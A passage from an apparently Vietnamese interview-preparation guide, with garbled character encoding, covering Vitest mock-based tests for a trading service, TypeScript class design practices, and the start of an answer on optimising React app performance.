  it('‚úÖ should place order when valid (khi l·ªánh h·ª£p l·ªá)', async () => {
 // Ch√∫ gi·∫£i: üß™ T·∫°o mocks cho t·∫•t c·∫£ dependencies
    const mockValidator = {
      validate: vi.fn(() => true), // Mock return true (l·ªánh h·ª£p l·ªá)
    };
    const mockRiskManager = {
      checkRisk: vi.fn(() => true), // Trong arrow function v·ªõi block `{ }` ph·∫£i d√πng `return` ƒë·ªÉ tr·∫£ gi√° tr·ªã; v·ªõi expression c√≥ th·ªÉ tr·∫£ ng·∫ßm (implicit return).
    };
    const mockExecutor = {
      execute: vi.fn(), // Mock execute (kh√¥ng th·ª±c thi th·∫≠t)
    };
    const mockLogger = {
      log: vi.fn(), // Ch√∫ gi·∫£i: Mock log (capture logs)
    };

    // üíâ Inject mocks v√†o TradingService
    const service = new TradingService(
      mockValidator,
      mockRiskManager,
      mockExecutor,
      mockLogger
    );

    // üéØ Test action: ƒë·∫∑t l·ªánh
    const order = new Order('AAPL', 100, 150, 'BUY');
    await service.placeOrder(order);

    // ‚úÖ Verify: c√°c methods ƒë√£ ƒë∆∞·ª£c g·ªçi v·ªõi ƒë√∫ng params
    expect(mockValidator.validate).toHaveBeenCalledWith(order);
    expect(mockValidator.validate).toHaveBeenCalledTimes(1);

    expect(mockRiskManager.checkRisk).toHaveBeenCalledWith(order);
    expect(mockRiskManager.checkRisk).toHaveBeenCalledTimes(1);

    expect(mockExecutor.execute).toHaveBeenCalledWith(order);
    expect(mockExecutor.execute).toHaveBeenCalledTimes(1);

    expect(mockLogger.log).toHaveBeenCalledTimes(2); // log 2 l·∫ßn (b·∫Øt ƒë·∫ßu + k·∫øt th√∫c)
  });

  it('‚ùå should throw error when validation fails (khi validate fail)', async () => {
 // Trong arrow function v·ªõi block `{ }` ph·∫£i d√πng `return` ƒë·ªÉ tr·∫£ gi√° tr·ªã; v·ªõi expression c√≥ th·ªÉ tr·∫£ ng·∫ßm (implicit return).
    const mockValidator = {
      validate: vi.fn(() => false), // ‚ùå L·ªánh kh√¥ng h·ª£p l·ªá
    };
    const mockRiskManager = { checkRisk: vi.fn() };
    const mockExecutor = { execute: vi.fn() };
    const mockLogger = { log: vi.fn() };

    const service = new TradingService(
      mockValidator,
      mockRiskManager,
      mockExecutor,
      mockLogger
    );

    const order = new Order('AAPL', -10, 150, 'BUY'); // S·ªë l∆∞·ª£ng √¢m

 // Ch√∫ gi·∫£i: ‚úÖ Expect throw error
    await expect(service.placeOrder(order)).rejects.toThrow(
      'L·ªánh kh√¥ng h·ª£p l·ªá!'
    );

    // ‚úÖ Verify: executor KH√îNG ƒë∆∞·ª£c g·ªçi (v√¨ validate fail)
    expect(mockExecutor.execute).not.toHaveBeenCalled();
  });

  it('‚ùå should throw error when risk check fails (khi v∆∞·ª£t h·∫°n m·ª©c)', async () => {
 // Trong arrow function v·ªõi block `{ }` ph·∫£i d√πng `return` ƒë·ªÉ tr·∫£ gi√° tr·ªã; v·ªõi expression c√≥ th·ªÉ tr·∫£ ng·∫ßm (implicit return).
    const mockValidator = { validate: vi.fn(() => true) };
    const mockRiskManager = {
      checkRisk: vi.fn(() => false), // Ch√∫ gi·∫£i: ‚ùå V∆∞·ª£t h·∫°n m·ª©c
    };
    const mockExecutor = { execute: vi.fn() };
    const mockLogger = { log: vi.fn() };

    const service = new TradingService(
      mockValidator,
      mockRiskManager,
      mockExecutor,
      mockLogger
    );

    const order = new Order('AAPL', 1_000_000, 200, 'BUY'); // L·ªánh qu√° l·ªõn

 // Ch√∫ gi·∫£i: ‚úÖ Expect throw error
    await expect(service.placeOrder(order)).rejects.toThrow(
      'V∆∞·ª£t h·∫°n m·ª©c r·ªßi ro!'
    );

    // ‚úÖ Verify: executor KH√îNG ƒë∆∞·ª£c g·ªçi (v√¨ risk check fail)
    expect(mockExecutor.execute).not.toHaveBeenCalled();
  });

  it('üìä should log correct messages (ki·ªÉm tra logs)', async () => {
    const mockValidator = { validate: vi.fn(() => true) };
    const mockRiskManager = { checkRisk: vi.fn(() => true) };
    const mockExecutor = { execute: vi.fn() };
    const mockLogger = { log: vi.fn() };

    const service = new TradingService(
      mockValidator,
      mockRiskManager,
      mockExecutor,
      mockLogger
    );

    const order = new Order('VNM', 500, 75.5, 'SELL');
    await service.placeOrder(order);

 // Ch√∫ gi·∫£i: ‚úÖ Verify logs
    expect(mockLogger.log).toHaveBeenCalledWith('üìù ƒê·∫∑t l·ªánh: SELL 500 VNM');
    expect(mockLogger.log).toHaveBeenCalledWith('‚úÖ ƒê·∫∑t l·ªánh th√†nh c√¥ng: VNM');
  });
});

// üí° L·ª£i √≠ch c·ªßa testing v·ªõi Composition + DI:
// ‚úÖ D·ªÖ mock: inject mock dependencies thay v√¨ real implementations
// ‚úÖ Isolated tests: test t·ª´ng unit ri√™ng bi·ªát, kh√¥ng ph·ª• thu·ªôc external services
// ‚úÖ Fast: kh√¥ng call API th·∫≠t, kh√¥ng database th·∫≠t
// ‚úÖ Predictable: mock return c·ªë ƒë·ªãnh ‚Üí tests deterministic
 // Ch√∫ gi·∫£i: ‚úÖ Coverage: d·ªÖ test edge cases (validation fail, risk fail, errors...)
```

---

**Best Practices:**

1. **Prefer Composition Over Inheritance**

   ```typescript
 // Ch√∫ gi·∫£i: ‚ùå BAD: Inheritance
   class UserService extends Logger {}

 // Ch√∫ gi·∫£i: ‚úÖ GOOD: Composition
   class UserService {
     constructor(private logger: Logger) {}
   }
   ```

2. **Use Private Fields `#` cho Encapsulation**

   ```typescript
   class User {
     #password: string; // Tr∆∞·ªùng private (v√≠ d·ª• `#field`) ch·ªâ truy c·∫≠p ƒë∆∞·ª£c trong class, kh√¥ng th·ªÉ truy c·∫≠p t·ª´ b√™n ngo√†i.

 // `this` ph·ª• thu·ªôc c√°ch g·ªçi; h√†m m≈©i t√™n d√πng lexical `this` (k·∫ø th·ª´a t·ª´ scope cha), c√°c h√†m th∆∞·ªùng c√≥ `this` thay ƒë·ªïi theo ng·ªØ c·∫£nh.
   }
   ```

3. **Dependency Injection cho Testability**

   ```typescript
 // Ch√∫ gi·∫£i: ‚úÖ GOOD: Inject dependencies
   class Service {
     constructor(private db: IDatabase, private logger: ILogger) {}
   }
   ```

4. **Abstract Classes cho Shared Logic**

   ```typescript
   abstract class BaseRepository<T> {
     abstract tableName: string;

 // Ch√∫ gi·∫£i: Shared method
     async findById(id: string): Promise<T | null> {
 // Ch√∫ gi·∫£i: Common query logic
     }
   }
   ```

5. **Interfaces cho Contract**

   ```typescript
   interface IPaymentGateway {
     charge(amount: number): Promise<boolean>;
     refund(transactionId: string): Promise<void>;
   }
   ```

6. **Single Responsibility Principle**

   ```typescript
 // Ch√∫ gi·∫£i: ‚úÖ One class = one job
   class UserValidator {
     validate() {}
   }
   class UserRepository {
     save() {}
   }
   class UserService {
     register() {}
   }
   ```

7. **Readonly Properties cho Immutability**
   ```typescript
   class Order {
     constructor(public readonly id: string, public readonly createdAt: Date) {}
   }
   ```

---

**Common Mistakes:**

1. **‚ùå Deep Inheritance Hierarchies**

   ```typescript
 // Sao ch√©p s√¢u: sao ch√©p ƒë·ªá quy m·ªçi c·∫•p ƒë·ªÉ t·∫°o b·∫£n sao ƒë·ªôc l·∫≠p; c√≥ th·ªÉ t·ªën hi·ªáu su·∫•t.
   class A {}
   class B extends A {}
   class C extends B {}
   class D extends C {} // Ch√∫ gi·∫£i: Hard to maintain

 // Ch√∫ gi·∫£i: ‚úÖ Use composition instead
   ```

2. **‚ùå Exposing Internal State**

   ```typescript
   class User {
     public password: string; // Ch√∫ gi·∫£i: ‚ùå Exposed!

 // Tr∆∞·ªùng private (v√≠ d·ª• `#field`) ch·ªâ truy c·∫≠p ƒë∆∞·ª£c trong class, kh√¥ng th·ªÉ truy c·∫≠p t·ª´ b√™n ngo√†i. Tr∆∞·ªùng private b·∫Øt ƒë·∫ßu b·∫±ng `#` ch·ªâ c√≥ th·ªÉ truy c·∫≠p trong class, g√¢y l·ªói khi truy c·∫≠p ngo√†i.
     #password: string;
     setPassword(pwd: string) {
       this.#password = hashPassword(pwd);
     }
   }
   ```

3. **‚ùå God Classes (Too Many Responsibilities)**

   ```typescript
   class UserManager {
     validateUser() {}
     saveUser() {}
     sendEmail() {}
     logActivity() {}
 // Ch√∫ gi·∫£i: ‚ùå Too many jobs! Split into separate classes
   }
   ```

4. **‚ùå Tight Coupling v·ªõi Concrete Classes**

   ```typescript
   class Service {
     private logger = new ConsoleLogger(); // Ch√∫ gi·∫£i: ‚ùå Hardcoded

 // Ch√∫ gi·∫£i: ‚úÖ Inject abstraction
     constructor(private logger: ILogger) {}
   }
   ```

5. **‚ùå Kh√¥ng Override `constructor` Correctly**

   ```typescript
   class Child extends Parent {
     constructor(name: string) {
       this.name = name; // Ch√∫ gi·∫£i: ‚ùå Must call super() first!
       super();
     }

 // Ch√∫ gi·∫£i: ‚úÖ Correct order
     constructor(name: string) {
       super();
       this.name = name;
     }
   }
   ```

6. **‚ùå Overriding Private Methods**

   ```typescript
   class Parent {
     #privateMethod() {} // Ch√∫ gi·∫£i: Cannot override in child
   }

 // Ch√∫ gi·∫£i: ‚úÖ Use protected in TypeScript
   class Parent {
     protected method() {} // Ch√∫ gi·∫£i: Can override
   }
   ```

7. **‚ùå Kh√¥ng Validate trong Constructor**

   ```typescript
   class User {
     constructor(email: string) {
       this.email = email; // Ch√∫ gi·∫£i: ‚ùå No validation
     }

 // Ch√∫ gi·∫£i: ‚úÖ Validate immediately
     constructor(email: string) {
       if (!email.includes('@')) throw new Error('Invalid email');
       this.email = email;
     }
   }
   ```

---
---
## 38. üöÄ Q38: T·ªëi ∆Øu Performance c·ªßa React Web App  

**P1: T√™n c√¢u h·ªèi:** üöÄ Q38: T·ªëi ∆Øu Performance c·ªßa React Web App  

**P2: Tr·∫£ l·ªùi (Senior):**

## **‚≠ê T√ìM T·∫ÆT CHO PH·ªéNG V·∫§N SENIOR/STAFF**

### **üéØ C√¢u Tr·∫£ L·ªùi Ng·∫Øn G·ªçn (3-4 ph√∫t):**

**"T·ªëi ∆∞u hi·ªáu nƒÉng React = 5 l·ªõp: Build-time, M·∫°ng, Rendering, State, B·ªô nh·ªõ.**

**üèóÔ∏è Chi·∫øn L∆∞·ª£c T·ªëi ∆™u 5 L·ªõp:**

1. **T·ªëi ∆™u Build-time**:
   - **Chia Code**: `React.lazy()` + Suspense ‚Üí t·∫£i routes theo y√™u c·∫ßu.
   - **Tree-shaking**: X√≥a code kh√¥ng d√πng (ES modules + Webpack/Vite).
   - **Ph√¢n T√≠ch Bundle**: `webpack-bundle-analyzer` ‚Üí x√°c ƒë·ªãnh dependencies l·ªõn.
   - **M·ª•c ti√™u**: Gi·∫£m bundle 2.5MB ‚Üí 500KB (nhanh h∆°n 5 l·∫ßn).

2. **T·ªëi ∆™u M·∫°ng**:
   - **HTTP/2 + Brotli**: N√©n t√†i nguy√™n 70%.
   - **CDN**: Ph·ª•c v·ª• t√†i nguy√™n tƒ©nh t·ª´ edge servers (ƒë·ªô tr·ªÖ th·∫•p h∆°n).
   - **G·ª£i √Ω T√†i Nguy√™n**: `<link rel="preload">` fonts, CSS quan tr·ªçng.
   - **Service Worker**: Cache t√†i nguy√™n tƒ©nh ‚Üí h·ªó tr·ª£ offline.

3. **T·ªëi ∆™u Rendering** (‚ö° Quan Tr·ªçng Nh·∫•t):
   - **React.memo()**: NgƒÉn con render l·∫°i khi props kh√¥ng ƒë·ªïi.
   - **useMemo/useCallback**: Cache t√≠nh to√°n/h√†m t·ªën k√©m.
   - **Virtual Scrolling**: `react-window` cho 10K+ items ‚Üí ch·ªâ render ph·∫ßn hi·ªÉn th·ªã.
   - **Debounce/Throttle**: Gi·ªõi h·∫°n event handlers (scroll, resize, input).
   - **Lazy Images**: `loading="lazy"` + Intersection Observer.

4. **Qu·∫£n L√Ω State**:
   - **T√°ch Context**: T√°ch contexts nh·ªè ‚Üí ngƒÉn re-renders kh√¥ng c·∫ßn thi·∫øt.
   - **Zustand/Redux Toolkit**: ƒêƒÉng k√Ω ch·ªçn l·ªçc ‚Üí components ch·ªâ render l·∫°i khi state th·ª±c s·ª± d√πng thay ƒë·ªïi.
   - **React Query**: Cache d·ªØ li·ªáu server ‚Üí gi·∫£m l·ªùi g·ªçi API.
   - **Immer**: C·∫≠p nh·∫≠t b·∫•t bi·∫øn hi·ªáu qu·∫£ (√≠t boilerplate h∆°n).

5. **Qu·∫£n L√Ω B·ªô Nh·ªõ**:
   - **D·ªçn D·∫πp Effects**: `useEffect` tr·∫£ v·ªÅ cleanup ‚Üí x√≥a listeners, h·ªßy timers.
   - **WeakMap**: Gi·ªØ tham chi·∫øu y·∫øu ‚Üí t·ª± ƒë·ªông GC.
   - **Profiling**: Chrome DevTools Memory tab ‚Üí ph√°t hi·ªán r√≤ r·ªâ.

**üéØ Real-time Updates Optimization (WebSocket):**
- **Problem**: 1000 updates/s ‚Üí 60+ components re-render ‚Üí UI freeze.
- **Solution**:
  1. **Debounce updates**: Batch 100 updates/100ms ‚Üí 10 batches/s instead of 1000 renders/s.
  2. **Selective subscriptions**: Components subscribe to specific data slices.
  3. **Virtual scrolling**: Render only visible items.
  4. **Memoization**: `React.memo` + `useMemo` prevent unnecessary re-renders.

**üìä Performance Metrics (Web Vitals):**
- **LCP (Largest Contentful Paint)**: < 2.5s (good), 2.5-4s (needs improvement), > 4s (poor).
- **FID (First Input Delay)**: < 100ms.
- **CLS (Cumulative Layout Shift)**: < 0.1.
- **Tools**: Lighthouse, Web Vitals library, Chrome DevTools Performance tab.

**‚ö†Ô∏è Common Mistakes:**
- **Inline functions/objects**: T·∫°o new reference m·ªói render ‚Üí child re-render.
  ```jsx
 // Ch√∫ gi·∫£i: ‚ùå Bad
  <Child onClick={() => handle()} data={{ id: 1 }} />
 // Ch√∫ gi·∫£i: ‚úÖ Good
  const handleClick = useCallback(() => handle(), []);
  const data = useMemo(() => ({ id: 1 }), []);
  <Child onClick={handleClick} data={data} />
  ```
- **Overuse useMemo/useCallback**: Premature optimization ‚Üí ch·ªâ d√πng khi ƒëo ƒë∆∞·ª£c bottleneck.
- **Missing dependencies**: `useEffect([])` nh∆∞ng d√πng props/state inside ‚Üí stale closure.

**üí° Senior Insights:**
- **Profiler**: `<Profiler>` component + DevTools ‚Üí measure render time.
- **Concurrent Mode**: React 18 `useTransition` ‚Üí non-urgent updates kh√¥ng block UI.
- **Bundle Budget**: Set budget (500KB) ‚Üí CI fail n·∫øu v∆∞·ª£t.
- **Lighthouse CI**: Auto performance testing trong CI/CD.

---

**‚ùì T√¨nh Hu·ªëng:**

B·∫°n l√† Senior Frontend Developer c·ªßa m·ªôt Trading Platform (React + TypeScript). App hi·ªán t·∫°i c√≥ c√°c v·∫•n ƒë·ªÅ:

- **Initial Load**: 5-7s tr√™n 3G, bundle size 2.5MB
- **Runtime Performance**:
  - Real-time updates (WebSocket) g√¢y re-render to√†n b·ªô app (60+ components)
  - List 10,000+ orders lag khi scroll (FPS drop 60 ‚Üí 15)
  - Memory leak sau 2-3 gi·ªù s·ª≠ d·ª•ng (memory tƒÉng t·ª´ 50MB ‚Üí 500MB)
- **User Complaints**: App ch·∫≠m, lag, sometimes crash

**Y√™u c·∫ßu:** Thi·∫øt k·∫ø v√† implement chi·∫øn l∆∞·ª£c t·ªëi ∆∞u to√†n di·ªán (t·ª´ build-time ƒë·∫øn runtime).

**‚úÖ ƒê√°p √Ån Chi Ti·∫øt:**

**üéØ Chi·∫øn L∆∞·ª£c T·ªëi ∆Øu 5 T·∫ßng (5-Layer Optimization Strategy):**

```
‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
‚îÇ           PERFORMANCE OPTIMIZATION LAYERS                     ‚îÇ
‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§
‚îÇ                                                               ‚îÇ
‚îÇ  1Ô∏è‚É£ BUILD-TIME OPTIMIZATION (T·ªëi ∆∞u l√∫c build)              ‚îÇ
‚îÇ  ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê ‚îÇ
‚îÇ  ‚îÇ ‚Ä¢ Bundle Size Reduction (Gi·∫£m k√≠ch th∆∞·ªõc bundle)        ‚îÇ ‚îÇ
‚îÇ  ‚îÇ ‚Ä¢ Code Splitting (Chia nh·ªè code)                        ‚îÇ ‚îÇ
‚îÇ  ‚îÇ ‚Ä¢ Tree-shaking (Lo·∫°i b·ªè dead code)                      ‚îÇ ‚îÇ
‚îÇ  ‚îÇ ‚Ä¢ Lazy Loading (T·∫£i code khi c·∫ßn)                       ‚îÇ ‚îÇ
‚îÇ  ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò ‚îÇ
‚îÇ                                                               ‚îÇ
‚îÇ  2Ô∏è‚É£ NETWORK OPTIMIZATION (T·ªëi ∆∞u m·∫°ng)                      ‚îÇ
‚îÇ  ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê ‚îÇ
‚îÇ  ‚îÇ ‚Ä¢ Resource Hints (Prefetch, Preload, Preconnect)       ‚îÇ ‚îÇ
‚îÇ  ‚îÇ ‚Ä¢ HTTP/2 + Compression (Gzip, Brotli)                  ‚îÇ ‚îÇ
‚îÇ  ‚îÇ ‚Ä¢ CDN + Edge Caching                                    ‚îÇ ‚îÇ
‚îÇ  ‚îÇ ‚Ä¢ Service Worker + Offline Cache                       ‚îÇ ‚îÇ
‚îÇ  ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò ‚îÇ
‚îÇ                                                               ‚îÇ
‚îÇ  3Ô∏è‚É£ RENDERING OPTIMIZATION (T·ªëi ∆∞u render)                  ‚îÇ
‚îÇ  ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê ‚îÇ
‚îÇ  ‚îÇ ‚Ä¢ React.memo + useMemo + useCallback                   ‚îÇ ‚îÇ
‚îÇ  ‚îÇ ‚Ä¢ Virtual Scrolling (10K+ items)                        ‚îÇ ‚îÇ
‚îÇ  ‚îÇ ‚Ä¢ Debounce + Throttle                                   ‚îÇ ‚îÇ
‚îÇ  ‚îÇ ‚Ä¢ Lazy Image Loading + Responsive Images               ‚îÇ ‚îÇ
‚îÇ  ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò ‚îÇ
‚îÇ                                                               ‚îÇ
‚îÇ  4Ô∏è‚É£ STATE MANAGEMENT OPTIMIZATION (T·ªëi ∆∞u state)            ‚îÇ
‚îÇ  ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê ‚îÇ
‚îÇ  ‚îÇ ‚Ä¢ Context Splitting (T√°ch context nh·ªè)                  ‚îÇ ‚îÇ
‚îÇ  ‚îÇ ‚Ä¢ Zustand/Redux Toolkit (Selective subscriptions)      ‚îÇ ‚îÇ
‚îÇ  ‚îÇ ‚Ä¢ Immer (Immutable updates hi·ªáu qu·∫£)                    ‚îÇ ‚îÇ
‚îÇ  ‚îÇ ‚Ä¢ React Query (Server state caching)                   ‚îÇ ‚îÇ
‚îÇ  ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò ‚îÇ
‚îÇ                                                               ‚îÇ
‚îÇ  5Ô∏è‚É£ MEMORY MANAGEMENT (T·ªëi ∆∞u b·ªô nh·ªõ)                       ‚îÇ
‚îÇ  ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê ‚îÇ
‚îÇ  ‚îÇ ‚Ä¢ Cleanup useEffect (Listeners, timers, subscriptions) ‚îÇ ‚îÇ
‚îÇ  ‚îÇ ‚Ä¢ AbortController (Cancel requests)                     ‚îÇ ‚îÇ
‚îÇ  ‚îÇ ‚Ä¢ WeakMap/WeakSet (Temporary references)               ‚îÇ ‚îÇ
‚îÇ  ‚îÇ ‚Ä¢ Memory Profiling (Chrome DevTools)                   ‚îÇ ‚îÇ
‚îÇ  ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò ‚îÇ
‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò
```

**Ho·∫°t ƒë·ªông:**

**üìä Performance Metrics Target (M·ª•c ti√™u):**

- Initial Load: 5-7s ‚Üí **< 2s** (70% improvement)
- Bundle Size: 2.5MB ‚Üí **< 500KB** (80% reduction)
- FPS: 15 ‚Üí **60 FPS** (4x improvement)
- Memory: 500MB ‚Üí **< 100MB** (80% reduction)

---

**Code Example (TypeScript + React):**

```typescript
 // Ch√∫ gi·∫£i: ============================================
// 1Ô∏è‚É£ BUILD-TIME OPTIMIZATION (T·ªêI ∆ØU L√öC BUILD)
 // Ch√∫ gi·∫£i: ============================================

// üì¶ A. C·∫•u H√¨nh Vite (C√¥ng c·ª• build hi·ªán ƒë·∫°i - nhanh h∆°n Webpack)
 // Ch√∫ gi·∫£i: File: vite.config.ts
import { defineConfig } from 'vite';
import react from '@vitejs/plugin-react';
import { visualizer } from 'rollup-plugin-visualizer';

export default defineConfig({
  plugins: [
    react(), // Ch√∫ gi·∫£i: Plugin h·ªó tr·ª£ React (Fast Refresh, JSX transform)
    visualizer({ open: true }), // Plugin ph√¢n t√≠ch bundle size (m·ªü browser sau build)
  ],

  build: {
    // ‚úÖ Code Splitting: Chia nh·ªè bundle th√†nh nhi·ªÅu file
    // L√Ω do: Browser ch·ªâ t·∫£i file c·∫ßn thi·∫øt ‚Üí gi·∫£m Initial Load time
    rollupOptions: {
      output: {
        manualChunks: {
